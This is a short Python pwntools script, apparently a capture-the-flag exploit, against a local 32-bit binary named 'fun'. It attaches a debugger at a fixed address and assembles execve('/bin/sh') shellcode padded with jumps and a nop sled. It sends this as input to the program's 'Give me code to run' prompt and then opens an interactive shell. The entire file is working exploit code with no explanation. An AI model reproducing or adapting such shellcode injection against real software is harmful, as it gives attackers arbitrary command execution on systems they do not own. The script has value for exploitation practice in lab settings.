from pwn import *

from pwn import *
from struct import pack

exe = ELF("./fun")
context.binary = exe
context.terminal = "konsole -e".split()

def gdbdebug(proc: process):
    script = """
    b *0x080485c9
    continue
    step
    x/100x $eax
    """
    gdb.attach(proc, gdbscript=script)
    
p = process()
gdbdebug(p)
shellcode = shellcraft.execve('/bin/sh')

payload = asm('jmp $+0x60 ; ' + shellcode + 'nop ; ' * 20 + 'jmp $+0x51 ;')
p.sendlineafter(b"Give me code to run:\n", payload)
p.interactive()
